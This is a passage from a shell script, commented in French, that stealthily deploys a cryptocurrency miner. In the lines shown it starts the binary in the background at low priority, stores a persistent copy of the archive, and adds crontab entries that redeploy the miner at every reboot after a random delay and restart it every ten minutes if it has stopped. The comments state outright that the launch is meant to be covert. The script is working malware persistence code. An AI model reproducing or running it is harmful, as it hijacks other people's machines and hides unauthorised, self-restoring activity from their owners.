...
# Vérifier que le binaire est là et exécutable
chmod +x "$BIN"

# Lancer furtivement avec log temporaire
nohup nice -n 19 "$DIR/$BIN" --config="$DIR/config.json" > "$LOGFILE" 2>&1 &

# Sauvegarde dans un dossier persistant
cp miner.tar.gz "$PERSIST_ARCHIVE"

# Cron reboot : re-déploiement furtif + log debug
(crontab -l 2>/dev/null; echo "@reboot sleep \$((RANDOM % 60)) && mkdir -p $DIR && tar -xzf $PERSIST_ARCHIVE -C $DIR && $DIR/$BIN --config=$DIR/config.json > $LOGFILE 2>&1") | crontab -

# Watchdog toutes les 10 min avec log debug
(crontab -l 2>/dev/null; echo "*/10 * * * * pgrep -f $BIN > /dev/null || (mkdir -p $DIR && tar -xzf $PERSIST_ARCHIVE -C $DIR && $DIR/$BIN --config=$DIR/config.json > $LOGFILE 2>&1)") | crontab -
